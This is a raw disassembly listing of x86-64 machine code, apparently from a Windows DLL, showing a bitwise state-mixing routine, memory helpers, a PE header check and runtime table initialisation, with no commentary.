    6968171a:	48 8b 54 24 20       	mov    0x20(%rsp),%rdx
    6968171f:	4c 33 6c 24 48       	xor    0x48(%rsp),%r13
    69681724:	4c 31 f5             	xor    %r14,%rbp
    69681727:	4c 21 ca             	and    %r9,%rdx
    6968172a:	4c 23 4c 24 10       	and    0x10(%rsp),%r9
    6968172f:	4c 31 c5             	xor    %r8,%rbp
    69681732:	4d 89 d0             	mov    %r10,%r8
    69681735:	48 31 fa             	xor    %rdi,%rdx
    69681738:	48 31 eb             	xor    %rbp,%rbx
    6968173b:	49 31 d0             	xor    %rdx,%r8
    6968173e:	4d 31 c5             	xor    %r8,%r13
    69681741:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
    69681746:	4d 31 f9             	xor    %r15,%r9
    69681749:	4c 8b 7c 24 08       	mov    0x8(%rsp),%r15
    6968174e:	4c 33 4c 24 60       	xor    0x60(%rsp),%r9
    69681753:	4d 21 e7             	and    %r12,%r15
    69681756:	4c 33 7c 24 60       	xor    0x60(%rsp),%r15
    6968175b:	4d 31 ca             	xor    %r9,%r10
    6968175e:	4d 31 c7             	xor    %r8,%r15
    69681761:	4c 8b 44 24 18       	mov    0x18(%rsp),%r8
    69681766:	4c 31 fb             	xor    %r15,%rbx
    69681769:	48 23 44 24 50       	and    0x50(%rsp),%rax
    6968176e:	4d 31 de             	xor    %r11,%r14
    69681771:	48 31 ea             	xor    %rbp,%rdx
    69681774:	4d 31 f7             	xor    %r14,%r15
    69681777:	49 31 d3             	xor    %rdx,%r11
    6968177a:	49 f7 d7             	not    %r15
    6968177d:	49 f7 d3             	not    %r11
    69681780:	4c 31 e8             	xor    %r13,%rax
    69681783:	4d 31 cd             	xor    %r9,%r13
    69681786:	4d 89 d1             	mov    %r10,%r9
    69681789:	49 31 c0             	xor    %rax,%r8
    6968178c:	4c 89 69 38          	mov    %r13,0x38(%rcx)
    69681790:	48 23 74 24 30       	and    0x30(%rsp),%rsi
    69681795:	4d 31 c1             	xor    %r8,%r9
    69681798:	4c 89 41 20          	mov    %r8,0x20(%rcx)
    6968179c:	48 33 74 24 48       	xor    0x48(%rsp),%rsi
    696817a1:	49 f7 d1             	not    %r9
    696817a4:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
    696817a9:	4c 89 79 08          	mov    %r15,0x8(%rcx)
    696817ad:	4c 89 49 30          	mov    %r9,0x30(%rcx)
    696817b1:	4c 8b 0c 24          	mov    (%rsp),%r9
    696817b5:	4c 33 44 24 58       	xor    0x58(%rsp),%r8
    696817ba:	4c 89 19             	mov    %r11,(%rcx)
    696817bd:	4d 21 e1             	and    %r12,%r9
    696817c0:	4c 31 cf             	xor    %r9,%rdi
    696817c3:	4c 31 c0             	xor    %r8,%rax
    696817c6:	4c 31 d7             	xor    %r10,%rdi
    696817c9:	48 89 41 18          	mov    %rax,0x18(%rcx)
    696817cd:	48 31 df             	xor    %rbx,%rdi
    696817d0:	48 31 f3             	xor    %rsi,%rbx
    696817d3:	48 f7 d7             	not    %rdi
    696817d6:	48 89 59 10          	mov    %rbx,0x10(%rcx)
    696817da:	48 89 79 28          	mov    %rdi,0x28(%rcx)
    696817de:	48 83 c4 78          	add    $0x78,%rsp
    696817e2:	5b                   	pop    %rbx
    696817e3:	5e                   	pop    %rsi
    696817e4:	5f                   	pop    %rdi
    696817e5:	5d                   	pop    %rbp
    696817e6:	41 5c                	pop    %r12
    696817e8:	41 5d                	pop    %r13
    696817ea:	41 5e                	pop    %r14
    696817ec:	41 5f                	pop    %r15
    696817ee:	c3                   	ret
    696817ef:	55                   	push   %rbp
    696817f0:	57                   	push   %rdi
    696817f1:	56                   	push   %rsi
    696817f2:	53                   	push   %rbx
    696817f3:	48 83 ec 28          	sub    $0x28,%rsp
    696817f7:	48 89 cb             	mov    %rcx,%rbx
    696817fa:	48 8b 09             	mov    (%rcx),%rcx
    696817fd:	4c 8b 43 08          	mov    0x8(%rbx),%r8
    69681801:	4c 8b 4b 30          	mov    0x30(%rbx),%r9
    69681805:	48 8b 7b 20          	mov    0x20(%rbx),%rdi
    69681809:	4c 8b 5b 10          	mov    0x10(%rbx),%r11
    6968180d:	4c 89 c2             	mov    %r8,%rdx
    69681810:	4c 8b 53 38          	mov    0x38(%rbx),%r10
    69681814:	4c 89 ce             	mov    %r9,%rsi
    69681817:	48 8b 43 28          	mov    0x28(%rbx),%rax
    6968181b:	48 31 fa             	xor    %rdi,%rdx
    6968181e:	4c 33 43 18          	xor    0x18(%rbx),%r8
    69681822:	48 31 d6             	xor    %rdx,%rsi
    69681825:	4c 31 df             	xor    %r11,%rdi
    69681828:	48 89 73 38          	mov    %rsi,0x38(%rbx)
    6968182c:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    69681830:	4c 31 d2             	xor    %r10,%rdx
    69681833:	4c 31 d7             	xor    %r10,%rdi
    69681836:	48 89 c5             	mov    %rax,%rbp
    69681839:	48 f7 d2             	not    %rdx
    6968183c:	48 89 7b 28          	mov    %rdi,0x28(%rbx)
    69681840:	4d 31 c8             	xor    %r9,%r8
    69681843:	48 89 53 10          	mov    %rdx,0x10(%rbx)
    69681847:	4c 89 43 20          	mov    %r8,0x20(%rbx)
    6968184b:	48 31 ce             	xor    %rcx,%rsi
    6968184e:	4c 31 d9             	xor    %r11,%rcx
    69681851:	48 31 c1             	xor    %rax,%rcx
    69681854:	4c 31 d8             	xor    %r11,%rax
    69681857:	49 31 f1             	xor    %rsi,%r9
    6968185a:	4c 31 d0             	xor    %r10,%rax
    6968185d:	48 31 f5             	xor    %rsi,%rbp
    69681860:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
    69681864:	48 89 d9             	mov    %rbx,%rcx
    69681867:	48 f7 d0             	not    %rax
    6968186a:	4c 89 4b 08          	mov    %r9,0x8(%rbx)
    6968186e:	48 89 03             	mov    %rax,(%rbx)
    69681871:	48 89 6b 30          	mov    %rbp,0x30(%rbx)
    69681875:	e8 7b fc ff ff       	call   0x696814f5
    6968187a:	4c 8b 4b 30          	mov    0x30(%rbx),%r9
    6968187e:	4c 8b 43 08          	mov    0x8(%rbx),%r8
    69681882:	48 8b 53 20          	mov    0x20(%rbx),%rdx
    69681886:	48 8b 43 28          	mov    0x28(%rbx),%rax
    6968188a:	4c 89 ce             	mov    %r9,%rsi
    6968188d:	4c 8b 53 38          	mov    0x38(%rbx),%r10
    69681891:	48 8b 0b             	mov    (%rbx),%rcx
    69681894:	4c 31 c2             	xor    %r8,%rdx
    69681897:	4c 8b 5b 10          	mov    0x10(%rbx),%r11
    6968189b:	48 31 d6             	xor    %rdx,%rsi
    6968189e:	48 89 c7             	mov    %rax,%rdi
    696818a1:	4c 33 43 18          	xor    0x18(%rbx),%r8
    696818a5:	48 89 73 38          	mov    %rsi,0x38(%rbx)
    696818a9:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    696818ad:	4c 31 d2             	xor    %r10,%rdx
    696818b0:	48 f7 d2             	not    %rdx
    696818b3:	48 89 53 10          	mov    %rdx,0x10(%rbx)
    696818b7:	4d 31 c8             	xor    %r9,%r8
    696818ba:	48 31 ce             	xor    %rcx,%rsi
    696818bd:	4c 31 d9             	xor    %r11,%rcx
    696818c0:	48 31 f7             	xor    %rsi,%rdi
    696818c3:	48 31 c1             	xor    %rax,%rcx
    696818c6:	4c 31 d8             	xor    %r11,%rax
    696818c9:	48 89 7b 30          	mov    %rdi,0x30(%rbx)
    696818cd:	48 8b 7b 20          	mov    0x20(%rbx),%rdi
    696818d1:	4c 31 d0             	xor    %r10,%rax
    696818d4:	49 31 f1             	xor    %rsi,%r9
    696818d7:	48 f7 d0             	not    %rax
    696818da:	4c 89 43 20          	mov    %r8,0x20(%rbx)
    696818de:	48 89 4b 18          	mov    %rcx,0x18(%rbx)
    696818e2:	4c 89 4b 08          	mov    %r9,0x8(%rbx)
    696818e6:	4c 31 df             	xor    %r11,%rdi
    696818e9:	48 89 03             	mov    %rax,(%rbx)
    696818ec:	4c 31 d7             	xor    %r10,%rdi
    696818ef:	48 89 7b 28          	mov    %rdi,0x28(%rbx)
    696818f3:	48 83 c4 28          	add    $0x28,%rsp
    696818f7:	5b                   	pop    %rbx
    696818f8:	5e                   	pop    %rsi
    696818f9:	5f                   	pop    %rdi
    696818fa:	5d                   	pop    %rbp
    696818fb:	c3                   	ret
    696818fc:	c3                   	ret
    696818fd:	c3                   	ret
    696818fe:	48 8d 05 fb c6 00 00 	lea    0xc6fb(%rip),%rax        # 0x6968e000
    69681905:	48 85 c9             	test   %rcx,%rcx
    69681908:	74 0a                	je     0x69681914
    6968190a:	48 83 39 00          	cmpq   $0x0,(%rcx)
    6968190e:	74 04                	je     0x69681914
    69681910:	48 8d 41 10          	lea    0x10(%rcx),%rax
    69681914:	c3                   	ret
    69681915:	c3                   	ret
    69681916:	c3                   	ret
    69681917:	c3                   	ret
    69681918:	b8 04 00 00 00       	mov    $0x4,%eax
    6968191d:	48 85 c9             	test   %rcx,%rcx
    69681920:	74 16                	je     0x69681938
    69681922:	48 8d 04 49          	lea    (%rcx,%rcx,2),%rax
    69681926:	48 8d 14 09          	lea    (%rcx,%rcx,1),%rdx
    6968192a:	48 d1 f8             	sar    $1,%rax
    6968192d:	48 81 f9 ff ff 00 00 	cmp    $0xffff,%rcx
    69681934:	48 0f 4e c2          	cmovle %rdx,%rax
    69681938:	c3                   	ret
    69681939:	c3                   	ret
    6968193a:	81 f9 ff ff 00 00    	cmp    $0xffff,%ecx
    69681940:	89 c8                	mov    %ecx,%eax
    69681942:	76 13                	jbe    0x69681957
    69681944:	81 f9 00 00 00 01    	cmp    $0x1000000,%ecx
    6968194a:	48 19 c9             	sbb    %rcx,%rcx
    6968194d:	48 83 e1 f8          	and    $0xfffffffffffffff8,%rcx
    69681951:	48 83 c1 18          	add    $0x18,%rcx
    69681955:	eb 0f                	jmp    0x69681966
    69681957:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
    6968195d:	48 19 c9             	sbb    %rcx,%rcx
    69681960:	48 f7 d1             	not    %rcx
    69681963:	83 e1 08             	and    $0x8,%ecx
    69681966:	48 8d 15 93 ce 00 00 	lea    0xce93(%rip),%rdx        # 0x6968e800
    6968196d:	d3 e8                	shr    %cl,%eax
    6968196f:	48 0f be 04 02       	movsbq (%rdx,%rax,1),%rax
    69681974:	48 01 c8             	add    %rcx,%rax
    69681977:	c3                   	ret
    69681978:	57                   	push   %rdi
    69681979:	56                   	push   %rsi
    6968197a:	48 8b 3a             	mov    (%rdx),%rdi
    6968197d:	48 8d 72 10          	lea    0x10(%rdx),%rsi
    69681981:	48 89 c8             	mov    %rcx,%rax
    69681984:	48 8b 09             	mov    (%rcx),%rcx
    69681987:	4c 8d 44 08 10       	lea    0x10(%rax,%rcx,1),%r8
    6968198c:	48 8d 4f 01          	lea    0x1(%rdi),%rcx
    69681990:	4c 89 c7             	mov    %r8,%rdi
    69681993:	f3 a4                	rep movsb (%rsi),(%rdi)
    69681995:	48 8b 12             	mov    (%rdx),%rdx
    69681998:	48 01 10             	add    %rdx,(%rax)
    6968199b:	5e                   	pop    %rsi
    6968199c:	5f                   	pop    %rdi
    6968199d:	c3                   	ret
    6968199e:	48 85 d2             	test   %rdx,%rdx
    696819a1:	74 02                	je     0x696819a5
    696819a3:	eb d3                	jmp    0x69681978
    696819a5:	c3                   	ret
    696819a6:	48 83 ec 28          	sub    $0x28,%rsp
    696819aa:	b0 01                	mov    $0x1,%al
    696819ac:	48 39 d1             	cmp    %rdx,%rcx
    696819af:	74 16                	je     0x696819c7
    696819b1:	31 c0                	xor    %eax,%eax
    696819b3:	48 85 c9             	test   %rcx,%rcx
    696819b6:	74 0f                	je     0x696819c7
    696819b8:	48 85 d2             	test   %rdx,%rdx
    696819bb:	74 0a                	je     0x696819c7
    696819bd:	e8 56 ac 00 00       	call   0x6968c618
    696819c2:	85 c0                	test   %eax,%eax
    696819c4:	0f 94 c0             	sete   %al
    696819c7:	48 83 c4 28          	add    $0x28,%rsp
    696819cb:	c3                   	ret
    696819cc:	57                   	push   %rdi
    696819cd:	31 c0                	xor    %eax,%eax
    696819cf:	49 89 c8             	mov    %rcx,%r8
    696819d2:	48 89 d1             	mov    %rdx,%rcx
    696819d5:	4c 89 c7             	mov    %r8,%rdi
    696819d8:	f3 aa                	rep stos %al,(%rdi)
    696819da:	5f                   	pop    %rdi
    696819db:	c3                   	ret
    696819dc:	48 83 ec 38          	sub    $0x38,%rsp
    696819e0:	49 89 ca             	mov    %rcx,%r10
    696819e3:	49 89 d1             	mov    %rdx,%r9
    696819e6:	ba 10 00 00 00       	mov    $0x10,%edx
    696819eb:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    696819f0:	e8 d7 ff ff ff       	call   0x696819cc
    696819f5:	44 89 c9             	mov    %r9d,%ecx
    696819f8:	e8 3d ff ff ff       	call   0x6968193a
    696819fd:	8d 48 fb             	lea    -0x5(%rax),%ecx
    69681a00:	48 83 e8 06          	sub    $0x6,%rax
    69681a04:	49 d3 f9             	sar    %cl,%r9
    69681a07:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    69681a0c:	4c 89 d0             	mov    %r10,%rax
    69681a0f:	49 83 e9 20          	sub    $0x20,%r9
    69681a13:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
    69681a18:	0f 28 44 24 20       	movaps 0x20(%rsp),%xmm0
    69681a1d:	41 0f 11 02          	movups %xmm0,(%r10)
    69681a21:	48 83 c4 38          	add    $0x38,%rsp
    69681a25:	c3                   	ret
    69681a26:	57                   	push   %rdi
    69681a27:	53                   	push   %rbx
    69681a28:	48 83 ec 28          	sub    $0x28,%rsp
    69681a2c:	45 31 c0             	xor    %r8d,%r8d
    69681a2f:	48 85 d2             	test   %rdx,%rdx
    69681a32:	48 89 cb             	mov    %rcx,%rbx
    69681a35:	49 89 d2             	mov    %rdx,%r10
    69681a38:	74 15                	je     0x69681a4f
    69681a3a:	48 89 d7             	mov    %rdx,%rdi
    69681a3d:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
    69681a41:	31 c0                	xor    %eax,%eax
    69681a43:	f2 ae                	repnz scas (%rdi),%al
    69681a45:	48 89 ca             	mov    %rcx,%rdx
    69681a48:	48 f7 d2             	not    %rdx
    69681a4b:	4c 8d 42 ff          	lea    -0x1(%rdx),%r8
    69681a4f:	4c 89 d1             	mov    %r10,%rcx
    69681a52:	49 89 d9             	mov    %rbx,%r9
    69681a55:	ba 01 00 00 00       	mov    $0x1,%edx
    69681a5a:	e8 e1 a8 00 00       	call   0x6968c340
    69681a5f:	48 89 d9             	mov    %rbx,%rcx
    69681a62:	48 83 c4 28          	add    $0x28,%rsp
    69681a66:	5b                   	pop    %rbx
    69681a67:	5f                   	pop    %rdi
    69681a68:	e9 e3 a8 00 00       	jmp    0x6968c350
    69681a6d:	48 8b 41 28          	mov    0x28(%rcx),%rax
    69681a71:	c3                   	ret
    69681a72:	e9 87 fe ff ff       	jmp    0x696818fe
    69681a77:	48 8d 04 91          	lea    (%rcx,%rdx,4),%rax
    69681a7b:	c3                   	ret
    69681a7c:	48 8d 04 91          	lea    (%rcx,%rdx,4),%rax
    69681a80:	c3                   	ret
    69681a81:	48 63 42 0c          	movslq 0xc(%rdx),%rax
    69681a85:	48 29 c1             	sub    %rax,%rcx
    69681a88:	48 63 42 14          	movslq 0x14(%rdx),%rax
    69681a8c:	48 01 c8             	add    %rcx,%rax
    69681a8f:	c3                   	ret
    69681a90:	0f b6 c1             	movzbl %cl,%eax
    69681a93:	c3                   	ret
    69681a94:	41 b8 0b 00 00 00    	mov    $0xb,%r8d
    69681a9a:	31 c9                	xor    %ecx,%ecx
    69681a9c:	41 ba 09 00 00 00    	mov    $0x9,%r10d
    69681aa2:	4c 8d 49 0f          	lea    0xf(%rcx),%r9
    69681aa6:	48 83 c1 1e          	add    $0x1e,%rcx
    69681aaa:	4c 89 c8             	mov    %r9,%rax
    69681aad:	48 99                	cqto
    69681aaf:	49 f7 fa             	idiv   %r10
    69681ab2:	48 85 d2             	test   %rdx,%rdx
    69681ab5:	75 03                	jne    0x69681aba
    69681ab7:	4c 89 c9             	mov    %r9,%rcx
    69681aba:	49 ff c8             	dec    %r8
    69681abd:	75 e3                	jne    0x69681aa2
    69681abf:	48 89 c8             	mov    %rcx,%rax
    69681ac2:	c3                   	ret
    69681ac3:	85 c9                	test   %ecx,%ecx
    69681ac5:	0f 95 c0             	setne  %al
    69681ac8:	c3                   	ret
    69681ac9:	48 c1 e2 02          	shl    $0x2,%rdx
    69681acd:	48 89 c8             	mov    %rcx,%rax
    69681ad0:	48 29 d0             	sub    %rdx,%rax
    69681ad3:	c3                   	ret
    69681ad4:	31 c0                	xor    %eax,%eax
    69681ad6:	48 85 c9             	test   %rcx,%rcx
    69681ad9:	74 21                	je     0x69681afc
    69681adb:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
    69681ae0:	75 1a                	jne    0x69681afc
    69681ae2:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
    69681ae6:	48 01 d1             	add    %rdx,%rcx
    69681ae9:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
    69681aef:	75 0b                	jne    0x69681afc
    69681af1:	66 8b 41 16          	mov    0x16(%rcx),%ax
    69681af5:	66 c1 e8 0d          	shr    $0xd,%ax
    69681af9:	83 e0 01             	and    $0x1,%eax
    69681afc:	c3                   	ret
    69681afd:	48 8d 0d fd c4 00 00 	lea    0xc4fd(%rip),%rcx        # 0x6968e001
    69681b04:	c6 05 25 a9 10 00 11 	movb   $0x11,0x10a925(%rip)        # 0x6978c430
    69681b0b:	48 89 0d 96 7f 0f 00 	mov    %rcx,0xf7f96(%rip)        # 0x69779aa8
    69681b12:	48 8d 0d a7 7f 0f 00 	lea    0xf7fa7(%rip),%rcx        # 0x69779ac0
    69681b19:	48 89 0d 68 83 0f 00 	mov    %rcx,0xf8368(%rip)        # 0x69779e88
    69681b20:	48 8d 0d e9 c4 00 00 	lea    0xc4e9(%rip),%rcx        # 0x6968e010
    69681b27:	48 89 0d aa 7f 0f 00 	mov    %rcx,0xf7faa(%rip)        # 0x69779ad8
    69681b2e:	48 8d 0d bb 7f 0f 00 	lea    0xf7fbb(%rip),%rcx        # 0x69779af0
    69681b35:	48 89 0d 54 83 0f 00 	mov    %rcx,0xf8354(%rip)        # 0x69779e90
    69681b3c:	48 8d 0d db c4 00 00 	lea    0xc4db(%rip),%rcx        # 0x6968e01e
    69681b43:	48 89 0d be 7f 0f 00 	mov    %rcx,0xf7fbe(%rip)        # 0x69779b08
    69681b4a:	48 8d 0d cf 7f 0f 00 	lea    0xf7fcf(%rip),%rcx        # 0x69779b20
    69681b51:	48 8d 15 c8 8d 0f 00 	lea    0xf8dc8(%rip),%rdx        # 0x6977a920
    69681b58:	48 89 0d 39 83 0f 00 	mov    %rcx,0xf8339(%rip)        # 0x69779e98
    69681b5f:	48 8d 05 3a fe 0f 00 	lea    0xffe3a(%rip),%rax        # 0x697819a0
    69681b66:	48 89 15 93 7f 0f 00 	mov    %rdx,0xf7f93(%rip)        # 0x69779b00
    69681b6d:	48 8d 0d b3 c4 00 00 	lea    0xc4b3(%rip),%rcx        # 0x6968e027
    69681b74:	48 89 05 bd a8 10 00 	mov    %rax,0x10a8bd(%rip)        # 0x6978c438
    69681b7b:	48 89 15 ae 7f 0f 00 	mov    %rdx,0xf7fae(%rip)        # 0x69779b30
    69681b82:	48 8d 05 07 7f 0f 00 	lea    0xf7f07(%rip),%rax        # 0x69779a90
    69681b89:	48 89 0d a8 7f 0f 00 	mov    %rcx,0xf7fa8(%rip)        # 0x69779b38
    69681b90:	48 8d 0d b9 7f 0f 00 	lea    0xf7fb9(%rip),%rcx        # 0x69779b50
    69681b97:	48 89 15 c2 7f 0f 00 	mov    %rdx,0xf7fc2(%rip)        # 0x69779b60
    69681b9e:	48 8d 15 8c c4 00 00 	lea    0xc48c(%rip),%rdx        # 0x6968e031
    69681ba5:	48 89 05 d4 82 0f 00 	mov    %rax,0xf82d4(%rip)        # 0x69779e80
    69681bac:	48 8d 05 6d 8e 0f 00 	lea    0xf8e6d(%rip),%rax        # 0x6977aa20
    69681bb3:	48 89 15 ae 7f 0f 00 	mov    %rdx,0xf7fae(%rip)        # 0x69779b68
    69681bba:	48 8d 51 30          	lea    0x30(%rcx),%rdx
    69681bbe:	48 89 05 db 7e 0f 00 	mov    %rax,0xf7edb(%rip)        # 0x69779aa0
    69681bc5:	4c 8d 0d 34 d3 00 00 	lea    0xd334(%rip),%r9        # 0x6968ef00
    69681bcc:	48 89 05 fd 7e 0f 00 	mov    %rax,0xf7efd(%rip)        # 0x69779ad0
    69681bd3:	48 89 0d c6 82 0f 00 	mov    %rcx,0xf82c6(%rip)        # 0x69779ea0
    69681bda:	48 89 15 c7 82 0f 00 	mov    %rdx,0xf82c7(%rip)        # 0x69779ea8
    69681be1:	48 8d 15 56 c4 00 00 	lea    0xc456(%rip),%rdx        # 0x6968e03e
    69681be8:	48 c7 05 2d a8 10 00 	movq   $0x50,0x10a82d(%rip)        # 0x6978c420
    69681bef:	50 00 00 00 
    69681bf3:	48 c7 05 2a a8 10 00 	movq   $0x8,0x10a82a(%rip)        # 0x6978c428
    69681bfa:	08 00 00 00 
    69681bfe:	c6 05 8b 7e 0f 00 01 	movb   $0x1,0xf7e8b(%rip)        # 0x69779a90
    69681c05:	48 c7 05 88 7e 0f 00 	movq   $0x8,0xf7e88(%rip)        # 0x69779a98
    69681c0c:	08 00 00 00 
    69681c10:	c6 05 a9 7e 0f 00 01 	movb   $0x1,0xf7ea9(%rip)        # 0x69779ac0
    69681c17:	48 c7 05 a6 7e 0f 00 	movq   $0x10,0xf7ea6(%rip)        # 0x69779ac8
    69681c1e:	10 00 00 00 
    69681c22:	c6 05 c7 7e 0f 00 01 	movb   $0x1,0xf7ec7(%rip)        # 0x69779af0
    69681c29:	48 c7 05 c4 7e 0f 00 	movq   $0x18,0xf7ec4(%rip)        # 0x69779af8
    69681c30:	18 00 00 00 
    69681c34:	c6 05 e5 7e 0f 00 01 	movb   $0x1,0xf7ee5(%rip)        # 0x69779b20
    69681c3b:	48 c7 05 e2 7e 0f 00 	movq   $0x1c,0xf7ee2(%rip)        # 0x69779b28
    69681c42:	1c 00 00 00 
    69681c46:	c6 05 03 7f 0f 00 01 	movb   $0x1,0xf7f03(%rip)        # 0x69779b50
    69681c4d:	48 c7 05 00 7f 0f 00 	movq   $0x20,0xf7f00(%rip)        # 0x69779b58
    69681c54:	20 00 00 00 
    69681c58:	c6 05 21 7f 0f 00 01 	movb   $0x1,0xf7f21(%rip)        # 0x69779b80
    69681c5f:	48 c7 05 1e 7f 0f 00 	movq   $0x28,0xf7f1e(%rip)        # 0x69779b88
    69681c66:	28 00 00 00 
    69681c6a:	48 89 05 1f 7f 0f 00 	mov    %rax,0xf7f1f(%rip)        # 0x69779b90
    69681c71:	48 8d 05 c3 c3 00 00 	lea    0xc3c3(%rip),%rax        # 0x6968e03b
    69681c78:	48 89 05 19 7f 0f 00 	mov    %rax,0xf7f19(%rip)        # 0x69779b98
    69681c7f:	48 8d 41 60          	lea    0x60(%rcx),%rax
    69681c83:	48 89 05 26 82 0f 00 	mov    %rax,0xf8226(%rip)        # 0x69779eb0
    69681c8a:	48 8d 05 0f 2b 10 00 	lea    0x102b0f(%rip),%rax        # 0x697847a0
    69681c91:	48 89 05 28 7f 0f 00 	mov    %rax,0xf7f28(%rip)        # 0x69779bc0
    69681c98:	48 89 15 29 7f 0f 00 	mov    %rdx,0xf7f29(%rip)        # 0x69779bc8
    69681c9f:	48 8d 91 90 00 00 00 	lea    0x90(%rcx),%rdx
    69681ca6:	48 81 c1 c0 00 00 00 	add    $0xc0,%rcx
    69681cad:	48 89 05 3c 7f 0f 00 	mov    %rax,0xf7f3c(%rip)        # 0x69779bf0
    69681cb4:	48 89 05 65 7f 0f 00 	mov    %rax,0xf7f65(%rip)        # 0x69779c20
    69681cbb:	48 8d 05 8f c3 00 00 	lea    0xc38f(%rip),%rax        # 0x6968e051
    69681cc2:	48 89 05 5f 7f 0f 00 	mov    %rax,0xf7f5f(%rip)        # 0x69779c28
    69681cc9:	48 8d 41 30          	lea    0x30(%rcx),%rax
    69681ccd:	48 89 05 f4 81 0f 00 	mov    %rax,0xf81f4(%rip)        # 0x69779ec8
    69681cd4:	48 8d 05 85 35 10 00 	lea    0x103585(%rip),%rax        # 0x69785260
    69681cdb:	48 89 05 6e 7f 0f 00 	mov    %rax,0xf7f6e(%rip)        # 0x69779c50
    69681ce2:	48 8d 05 72 c3 00 00 	lea    0xc372(%rip),%rax        # 0x6968e05b
    69681ce9:	48 89 05 68 7f 0f 00 	mov    %rax,0xf7f68(%rip)        # 0x69779c58
    69681cf0:	48 8d 41 60          	lea    0x60(%rcx),%rax
    69681cf4:	48 89 05 d5 81 0f 00 	mov    %rax,0xf81d5(%rip)        # 0x69779ed0
    69681cfb:	48 8d 05 7e a8 10 00 	lea    0x10a87e(%rip),%rax        # 0x6978c580
    69681d02:	48 89 05 77 7f 0f 00 	mov    %rax,0xf7f77(%rip)        # 0x69779c80
    69681d09:	48 8d 05 56 c3 00 00 	lea    0xc356(%rip),%rax        # 0x6968e066
    69681d10:	48 89 15 a1 81 0f 00 	mov    %rdx,0xf81a1(%rip)        # 0x69779eb8
    69681d17:	48 8d 15 29 c3 00 00 	lea    0xc329(%rip),%rdx        # 0x6968e047
    69681d1e:	48 89 05 63 7f 0f 00 	mov    %rax,0xf7f63(%rip)        # 0x69779c88
    69681d25:	48 8d 81 90 00 00 00 	lea    0x90(%rcx),%rax
    69681d2c:	48 89 15 c5 7e 0f 00 	mov    %rdx,0xf7ec5(%rip)        # 0x69779bf8
    69681d33:	48 8d 91 c0 00 00 00 	lea    0xc0(%rcx),%rdx
    69681d3a:	48 89 0d 7f 81 0f 00 	mov    %rcx,0xf817f(%rip)        # 0x69779ec0
    69681d41:	48 8d 0d d8 7c 0f 00 	lea    0xf7cd8(%rip),%rcx        # 0x69779a20
    69681d48:	48 89 05 89 81 0f 00 	mov    %rax,0xf8189(%rip)        # 0x69779ed8
    69681d4f:	31 c0                	xor    %eax,%eax
    69681d51:	c6 05 58 7e 0f 00 01 	movb   $0x1,0xf7e58(%rip)        # 0x69779bb0
    69681d58:	48 c7 05 55 7e 0f 00 	movq   $0x30,0xf7e55(%rip)        # 0x69779bb8
    69681d5f:	30 00 00 00 
    69681d63:	c6 05 76 7e 0f 00 01 	movb   $0x1,0xf7e76(%rip)        # 0x69779be0
    69681d6a:	48 c7 05 73 7e 0f 00 	movq   $0x38,0xf7e73(%rip)        # 0x69779be8
    69681d71:	38 00 00 00 
    69681d75:	c6 05 94 7e 0f 00 01 	movb   $0x1,0xf7e94(%rip)        # 0x69779c10
    69681d7c:	48 c7 05 91 7e 0f 00 	movq   $0x40,0xf7e91(%rip)        # 0x69779c18
    69681d83:	40 00 00 00 
    69681d87:	c6 05 b2 7e 0f 00 01 	movb   $0x1,0xf7eb2(%rip)        # 0x69779c40
    69681d8e:	48 c7 05 af 7e 0f 00 	movq   $0x48,0xf7eaf(%rip)        # 0x69779c48
    69681d95:	48 00 00 00 
    69681d99:	c6 05 d0 7e 0f 00 01 	movb   $0x1,0xf7ed0(%rip)        # 0x69779c70
    69681da0:	48 c7 05 cd 7e 0f 00 	movq   $0x4c,0xf7ecd(%rip)        # 0x69779c78
    69681da7:	4c 00 00 00 
    69681dab:	48 c7 05 02 2b 10 00 	movq   $0x0,0x102b02(%rip)        # 0x697848b8
    69681db2:	00 00 00 00 
    69681db6:	48 c7 05 df 2a 10 00 	movq   $0x1,0x102adf(%rip)        # 0x697848a0
    69681dbd:	01 00 00 00 
    69681dc1:	48 c7 05 dc 2a 10 00 	movq   $0x1,0x102adc(%rip)        # 0x697848a8
    69681dc8:	01 00 00 00 
    69681dcc:	66 c7 05 db 2a 10 00 	movw   $0x30e,0x102adb(%rip)        # 0x697848b0
    69681dd3:	0e 03 
    69681dd5:	4d 8b 04 c1          	mov    (%r9,%rax,8),%r8
    69681dd9:	48 89 42 08          	mov    %rax,0x8(%rdx)
    69681ddd:	48 89 14 c1          	mov    %rdx,(%rcx,%rax,8)
    69681de1:	48 ff c0             	inc    %rax
    69681de4:	48 83 c2 30          	add    $0x30,%rdx
    69681de8:	c6 42 d0 01          	movb   $0x1,-0x30(%rdx)
    69681dec:	4c 89 42 e8          	mov    %r8,-0x18(%rdx)
    69681df0:	48 83 f8 07          	cmp    $0x7,%rax
    69681df4:	75 df                	jne    0x69681dd5
    69681df6:	48 8d 05 23 80 0f 00 	lea    0xf8023(%rip),%rax        # 0x69779e20
    69681dfd:	c6 05 1c 80 0f 00 02 	movb   $0x2,0xf801c(%rip)        # 0x69779e20
    69681e04:	48 89 05 b5 2a 10 00 	mov    %rax,0x102ab5(%rip)        # 0x697848c0
    69681e0b:	48 8d 05 8e 2a 10 00 	lea    0x102a8e(%rip),%rax        # 0x697848a0
    69681e12:	48 89 05 df a5 10 00 	mov    %rax,0x10a5df(%rip)        # 0x6978c3f8
    69681e19:	48 8d 05 30 80 0f 00 	lea    0xf8030(%rip),%rax        # 0x69779e50
    69681e20:	48 89 05 d9 a5 10 00 	mov    %rax,0x10a5d9(%rip)        # 0x6978c400
    69681e27:	48 8d 05 b2 a5 10 00 	lea    0x10a5b2(%rip),%rax        # 0x6978c3e0
    69681e2e:	48 89 05 7b 7e 0f 00 	mov    %rax,0xf7e7b(%rip)        # 0x69779cb0
    69681e35:	48 8d 05 33 c2 00 00 	lea    0xc233(%rip),%rax        # 0x6968e06f
    69681e3c:	48 89 05 75 7e 0f 00 	mov    %rax,0xf7e75(%rip)        # 0x69779cb8
